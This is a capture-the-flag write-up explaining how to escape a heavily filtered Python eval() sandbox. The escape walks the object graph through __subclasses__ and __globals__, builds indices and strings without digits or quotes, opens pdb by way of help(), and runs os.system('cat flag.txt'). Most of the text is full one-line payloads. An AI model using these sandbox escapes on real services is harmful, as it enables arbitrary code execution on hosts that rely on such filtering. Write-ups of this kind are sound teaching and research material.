# Michael Scofield &mdash; Solution

## Summary (TL;DR)

The challenge runs `eval()` over user input with heavy filtering: no digits or string literals, no parentheses with arguments, and common keywords like `import`/`open` blocked. By abusing Python's object model (accessing `__class__`, `__base__`, and `__subclasses__()`), we locate existing functions and modules indirectly. We force Python to load `pdb` (via `help()`), then enter the debugger and from there call `os.system("cat flag.txt")` to read the flag.

## What the sandbox enforces

From the provided `sandbox.py` we derive these constraints:

* Inputs must match the regex `([^()]|\(\))*` — **function calls with arguments are disallowed**, only zero-argument calls like `foo()` remain possible.
* Strings and numeric digits are explicitly forbidden by `check_pattern()` (no `"`, `'`, or `0–9` characters).
* Certain keywords are blocked if they appear in the input: `eval`, `exec`, `import`, `open`.
* `eval` runs with `{"__builtins__": None}` and an empty globals dict, so direct access to builtins is blocked in a normal eval context.
* Input length limit: 500 characters.

Given these constraints, we must: (A) call an existing zero-argument function that gives us access to more of the interpreter, and (B) craft any needed numbers/strings from allowed tokens.

## High-level plan

1. Use Python's type hierarchy to reach objects that still hold references to modules and builtins (via `().__class__.__base__.__subclasses__()`).
2. Find and call a zero-argument function that will *cause the interpreter to import or reveal modules* we can leverage (we use `help()`).
3. Use `help()` to implicitly import `pdb` (by looking up `pdb` inside the help prompt), which makes `pdb` available in `sys.modules`.
4. Find `pdb` in the `sys.modules` dict via the same `__subclasses__()` access path and call `set_trace()` to open the debugger — the debugger prompt runs outside the sandboxed `eval()` restrictions.
5. From the debugger prompt, call `os.system("cat flag.txt")` (using `__import__` obtained the same indirect way) to read the flag.
6. Construct any numeric indices and string names required using only boolean arithmetic and string slicing from existing docstrings — because direct digits and quotes are disallowed.


## Key ideas and primitives

### Reach interpreter objects

Every object has `__class__`. From an instance of `tuple` or `object` you can walk:

```python
().__class__.__base__.__subclasses__()  # list of classes tracked by the interpreter
```

Elements of this list have attributes (`__init__`, `__globals__`, etc.) that expose a `globals()` mapping containing references to `sys`, `__builtins__`, etc. We can therefore indirectly access modules and builtin functions.

### Call `help()` without writing the word `help`

`help` exists in `__builtins__`, but builtins are not accessible directly in the eval environment. However, `__init__.__globals__["__builtins__"]["help"]` gives us `help`. We call it with zero arguments (allowed) to trigger the help prompt and implicitly load modules we later need.

Example (conceptual):

```python
().__class__.__base__.__subclasses__()[INDEX].__init__.__globals__["__builtins__"]["help"]()
```

(We must compute `INDEX` without digits — see below.)

### Load `pdb` and enter its trace

With `help()` invoked, we can type `pdb` into the help prompt (manual step). That causes `pdb` to be imported and stored in `sys.modules`. Then we locate `sys` through a subclass globals mapping and call:

```python
().__class__.__base__.__subclasses__()[INDEX].__init__.__globals__["sys"].modules["pdb"].set_trace()
```

`set_trace()` drops us into an interactive debugger shell which is not subject to the sandbox's `input` filters; there we can execute arbitrary expressions.

### From debugger, import `os` and run system

Inside the debugger prompt we can call:

```python
().__class__.__base__.__subclasses__()[INDEX].__init__.
__globals__["__builtins__"]["__import__"]("os").system("cat flag.txt")
```

and read the flag.

## Building numbers and strings without digits or quotes

### Numbers

Python `True` and `False` are usable (they contain no digits or quotes). Use boolean arithmetic:

```python
one = True + False       # 1
two = one + one          # 2
three = two + one        # 3
```

You can grow numbers via addition, exponentiation, etc., all without using numeric characters.

### Strings

We cannot type string literals. Instead, steal text from available docstrings and attribute names (for example `.__doc__` from classes on the `__subclasses__()` list). Those docstrings contain letters and punctuation; by indexing and concatenating characters you can build any identifier you need (e.g., `"sys"`, `"pdb"`, `"__import__"`, `"os"`, `"cat flag.txt"` — the last can be built piecewise too).

Example idea:

```python
doc = () .__class__.__base__.__subclasses__()[k].__doc__
s = doc[1] + doc[5] + doc[3]   # build a 3-character string from doc chars
```

Because indexing uses numeric indices, indices themselves are constructed from `True`/`False` expressions (e.g. `d:=True+True` rather than `2`).

## One-line payload technique

To perform many assignments/expressions in a single eval input we use a list with the walrus operator (`:=`) to define intermediate variables in-line:

```python
[j:=True+False, n:=j-j, two:=j+j, ... , some_call()]
```

This compresses the entire exploit into a single allowed eval expression (still under the 500-char limit).

## Exploit steps

1. **Call `help()`** (indirectly) to allow loading `pdb` later:

```python
[j:=True+False,n:=j-j,d:=j+j,t:=j+d,c:=d+d,p:=d+t,s:=t+t,l:=s+j,
b:=d**l+d**d+d**t+d**c,
h:=().__class__.__base__.__subclasses__()[t].__doc__,
k:=().__class__.__base__.__subclasses__()[b].__init__.
__globals__[h[d**j+d**c]+h[d**j+d**c]+h[n]+h[d**c+d**p+d**s]+
h[d**j+d**t]+h[d**c]+h[d**j]+
h[d**j+d**t]+h[d**n+d**j+d**d+d**c]+h[d**n+d**t+d**c]+
h[d**j+d**c]+h[d**j+d**c]][h[d**j+d**t
+d**s+d**l]+h[d**n+d**j]+h[d**c]+h[d**d+d**l]]()]
```

Type `pdb` into the help prompt to cause Python to import the `pdb` module (this is an interactive step inside the help system).

2. **Enter the debugger** by locating `sys.modules["pdb"]` and calling `set_trace()`:

```python
[j:=True+False,n:=j-j,d:=j+j,t:=j+d,c:=d+d,p:=d+t,s:=t+t,
l:=s+j,b:=d**l+d**d+d**t+d**c,h:=().__class__.__base__.__subclasses__()[t].__doc__,
k:=().__class__.__base__.__subclasses__()[b].__init__.__globals__
[h[d**n+d**t+d**c]+h[d**n]+h[d**n+d**t+d**c]].
modules[h[d**d+d**l]+h[d**n+d**j+d**d+d**t+d**c+d**p]+h[n]].set_trace()]
```

This opens the debugging console (which ignores the original sandbox restrictions).

3. **From the debugger, run `os.system("cat flag.txt")`** using `__import__` accessed indirectly:

```python
().__class__.__base__.__subclasses__()[156].__init__.
__globals__["__builtins__"]["__import__"]("os").system("cat flag.txt")
```

That prints the flag: `FortID{Wh3n_7h3_517u4710n_l00k5_1mp0551bl3,_y0u_d0n7_g1v3_up}`

## Why this works (short)

The sandbox attempts to prevent direct imports, numeric and string literals, and direct builtin access. But it does not remove Python's runtime object graph — classes maintain references to their globals and the interpreter keeps a list of subclasses. By walking that graph you can reach `__builtins__` and `sys.modules` without typing forbidden words or characters, then use allowed zero-argument calls to transition into contexts (help/pdb) that let you execute arbitrary code.
